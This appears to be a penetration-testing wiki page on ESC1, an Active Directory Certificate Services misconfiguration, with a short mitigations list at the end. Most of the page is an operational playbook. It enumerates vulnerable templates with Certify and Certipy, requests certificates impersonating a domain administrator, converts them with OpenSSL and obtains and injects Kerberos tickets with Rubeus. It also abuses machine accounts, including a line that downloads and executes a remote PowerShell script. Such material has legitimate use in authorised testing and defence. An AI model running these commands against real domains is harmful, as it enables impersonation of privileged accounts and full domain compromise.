# ESC1

## Description

ESC1 is a privilege escalation vulnerability in certificate templates that allows any user with enrollment rights to supply a subjectAltName (SAN) for any other user or machine in Active Directory in the environment from the Certificate Authority (CA) , this allows the requesting user to receive a certificate for the targeted user and in turn, authenticate as them with the received certificate.

## ESC 1 - Windows Abuse

**Tools Required**

* Certify
* Rubeus
* OpenSSL: [https://slproweb.com/products/Win32OpenSSL.html](https://slproweb.com/products/Win32OpenSSL.html)
* Access to a UNIX system if unable to install OpenSSL on the testing Windows host

### Requirements for attack path

* ENROLLEE\_SUPPLIES\_SUBJECT flag in the certificate template
* Enrollment rights granted to a user or group for which we have access to
* Manager approval not enabled
* Authorized signature are not required

### Enumerate vulnerable certificate templates for ESC1 

```powershell
Invoke-Certify find /enrolleeSuppliesSubject /enabled
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In the above image of a vulnerable certificate template we have

* CA Name
* Template Name
* msPKI-Certificate-Name-Flag - ENROLLEE\_SUPPLIES-SUBJECT
* Authorized Signatures Required - 0 (Not required)
* pkiextendedkeyusage - contains Client Authentication
* Enrollment rights for a principal we own or are a member of (Domain Users)

Given this information, it is possible to abuse the ESC1 attack vector. As our user is a member of Domain Users we can request a certificate for any other user, ideally,  a Domain Administrator.

{% code overflow="wrap" %}
```powershell
# Syntax
Invoke-Certify request /"CA Name" /template:"Template" /altname:"User to Impersonate"

# Example
Invoke-Certify request /ca:SRV2019.Security.local\Security-SRV2019-CA /template:ESC1 /altname:arbiter
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Copy the private key and certificate output into a file on a host where OpenSSL is installed. Ensure the file extension is `.pem`.

{% tabs %}
{% tab title="Certificate.pem" %}
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvSMVrpG5BpRm8a0hfybpt7F5begLKJqXM69qRLMXO1De4QiW...
<---- Snip ---->
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIFnjCCBIagAwIBAgITOwAAAARKx4M83Cq7HwAAAAAABDANBgkqhkiG9w0BAQsF
<---- Snip ---->
-----END CERTIFICATE-----
```
{% endtab %}
{% endtabs %}

Issue the following with OpenSSL

{% tabs %}
{% tab title="Windows" %}
{% code overflow="wrap" %}
```powershell
# Convert the certificate to PFX, optionally setting a password
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in certificate.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out certificate.pfx

# If Base64 encoding the certificate (Not required)
[System.Convert]::ToBase64String((Get-Content -Path ".\certificate.pem" -Encoding Byte)) | Write-Output
```
{% endcode %}
{% endtab %}

{% tab title="Unix" %}
{% code overflow="wrap" %}
```python
# Convert the certificate to PFX, optionally setting a password
openssl pkcs12 -in certificate.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out certificate.pfx

# If Base64 encoding the certificate (Not required)
cat certificate.pfx | base64 -w 0
```
{% endcode %}
{% endtab %}
{% endtabs %}

Take either the Base64 output or certificate file path and use with Rubeus to requests a TGT of the target account.

{% tabs %}
{% tab title="Invoke-Rubeus" %}
{% code overflow="wrap" %}
```powershell
# Syntax (if certificate password was specified)
Invoke-Rubeus -Command "asktgt /user:<DomainAdmin> /password:<password> /aes256 /nowrap /getcredential /certificate:<Base64-Cert> or <path to PFX file>"

# Syntax (certificate password not specified)
Invoke-Rubeus -Command "asktgt /user:<DomainAdmin> /certificate:<Base64-Cert> /aes256 /nowrap /getcredential /certificate:<Base64-Cert> or <path to PFX file>"
```
{% endcode %}
{% endtab %}

{% tab title="Rubeus" %}
{% code overflow="wrap" %}
```powershell
# Syntax (if certificate password was specified)
Rubeus.exe asktgt /user:<DomainAdmin> /password:<password> /aes256 /nowrap /getcredential /certificate:<Base64-Cert> or <path to PFX file>

# Syntax (certificate password not specified)
Rubeus.exe asktgt /user:<DomainAdmin> /certificate:<Base64-Cert> /aes256 /nowrap /getcredential /certificate:<Base64-Cert> or <path to PFX file>
```
{% endcode %}
{% endtab %}
{% endtabs %}

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

With a TGT for the impersonated user  either pass the ticket directly into the current session, or use createnetonly to create a new  sacrificial logon session with the impersonated users ticket (preferred)

{% tabs %}
{% tab title="Invoke-Rubeus" %}
{% code overflow="wrap" %}
```powershell
# Syntax
Invoke-Rubeus -Command "createnetonly /program:c:\windows\system32\cmd.exe /username:<user> /password:fakepass /ptt /show /domain:<domain> /dc:<Domain Controller> /ticket:<ticket>"

# Example
Invoke-Rubeus -Command "createnetonly /program:c:\windows\system32\cmd.exe /username:arbiter /password:fakepass /ptt /show /domain:security.local /dc:dc01.security.local /ticket:doIGV<--Snip -->"
```
{% endcode %}
{% endtab %}

{% tab title="Rubeus" %}
{% code overflow="wrap" %}
```powershell
# Syntax
Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe /username:<user> /password:fakepass /ptt /show /domain:<domain> /dc:<Domain Controller> /ticket:<ticket>

# Example
Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe /username:arbiter /password:fakepass /ptt /show /domain:security.local /dc:dc01.security.local /ticket:doIGV<--Snip -->
```
{% endcode %}
{% endtab %}
{% endtabs %}



### &#x20;ESC1 - Windows  - Machine Account

Its not uncommon to find the ability for domain computers to have enrollment rights over templates.

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

To perform this attack you will need to be running a shell in the context of a domain computer (SYSTEM or TGT in memory for a computer account, or if a local administrator certify will attempt to elevate to SYSTEM).

{% tabs %}
{% tab title="Invoke-Certify" %}
{% code overflow="wrap" %}
```powershell
Invoke-Certify request /machine /"CA Name" /template:"Template" /altname:"User to Impersonate"

# Example
Invoke-Certify request /machine /ca:SRV2019.Security.local\Security-SRV2019-CA /template:ESC1 /altname:arbiter 
```
{% endcode %}
{% endtab %}

{% tab title="Certify" %}
<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Certify.exe request /machine /[CA Name] /template:[Template] /altname:[User to Impersonate]
</strong>
# Example
Certify.exe request /machine /ca:SRV2019.Security.local\Security-SRV2019-CA /template:ESC1 /altname:arbiter 
</code></pre>
{% endtab %}
{% endtabs %}

Repeat the steps in the section "Windows Abuse" from the point of requesting the certificate to complete the attack path.





### ESC1 - Windows - Machine Account Quota

The above section "ESC1 - Machine Account" presents an overview for abusing the ESC1 vulnerable template by abusing local administrative or SYSTEM level privileges for the current system to leverage the vulnerability.\
\
Another way to leverage this vulnerability for when "Domain Computers" have enrollement rights is by adding a new system to Active Dirctory\
\
Powermad can be used to enumerate for and add a new machine account to the domain.

Powermad: [https://github.com/Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad)

{% code overflow="wrap" %}
```powershell
# Load Powermad into memory
iex (iwr -UseBasicParsing https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1)

# Enumerate Machine Account Quota
New-MachineAccount -MachineAccount <ComputerName>

# New logon session as the machine account
runas.exe /user:security.local\EvilComputer$

# Run Certify (Without the /machine flag)
Invoke-Certify request /[CA Name] /template:[Template] /altname:[User to Impersonate]
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Repeat the steps in the section "Windows Abuse" from the point of requesting the certificate to complete the attack path.



## ESC1 - Linux Abuse

**Tools Required**

* Certipy: [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
* Impacket: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)

### Requirements for attack path

* Valid domain user credentials
* ENROLLEE\_SUPPLIES\_SUBJECT flag in the certificate template
* Enrollment rights granted to a user or group for which we have access to
* Manager approval not enabled
* Authorized signature are not required

### Enumerate vulnerable certificate templates for ESC1 

{% code overflow="wrap" %}
```python
# Syntax
certipy find -u <User@Domain.local> -p <Password> -dc-ip <IP> -enabled -vulnerable -stdout

# Example
certipy find -u truth@security.local -p Password123! -dc-ip 10.10.10.100 -enabled -vulnerable -stdout
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2124).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```python
# Syntax
certipy req -u <User@Domain.local> -p <Password> -dc-ip <IP> -ca <CA> -template <Template> -upn <User> -target <CA-IP>

# Example
certipy req -u truth@security.local -p Password1! -dc-ip 10.10.10.100 -ca Security-SRV2019-CA -template ESC1 -upn administrator -target 10.10.10.14
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2126).png" alt=""><figcaption></figcaption></figure>

<pre class="language-python" data-overflow="wrap"><code class="lang-python"><strong># Syntax
</strong><strong>certipy auth -pfx &#x3C;certificate.pfx> -username &#x3C;User> -domain &#x3C;Domain> -dc-ip &#x3C;IP>
</strong>
# Example
certipy auth -pfx administrator.pfx -username administrator -domain security.local -dc-ip 10.10.10.100
</code></pre>

<figure><img src="../../../.gitbook/assets/image (2128).png" alt=""><figcaption></figcaption></figure>

### ESC1 - Linux - Machine Account

If a template has enrollment rights for domain computers, a machine account can be used to request a certificate to perform the attack.  This requires having a hash or  password value for a machine account or if the domains machine account quota is greater than zero, adding a new machine ourselves to complete the attack.

<pre class="language-python" data-overflow="wrap"><code class="lang-python"><strong># If we do not have existing credentials for a machine account
</strong># maybe we can add a new machine account to the domain
<strong>impacket-addcomputer security.local/truth:'Password1!' -computer-name EvilComputer$ -computer-pass Password123! -method SAMR -dc-ip 10.10.10.100
</strong></code></pre>

{% code overflow="wrap" %}
```python
# Syntax
certipy req -u <Computer$> -p <Password> -dc-ip <DC-IP> -ca <CA> -template <Template> -upn <User> -target <CA-IP>

# Example
certipy req -u EvilComputer$ -p Password123! -dc-ip 10.10.10.100 -ca Security-SRV2019-CA -template ESC1 -upn administrator -target 10.10.10.14
```
{% endcode %}

## Mitigations

* Remove the ENROLEE\_SUPPLIES\_SUBJECT flag from the certificate template
* Ensure Manager approval is required on the certificate
* Require authorized signatures
* If possible, remove Enrollment rights for low privileges groups such as Domain users and Domain Computers
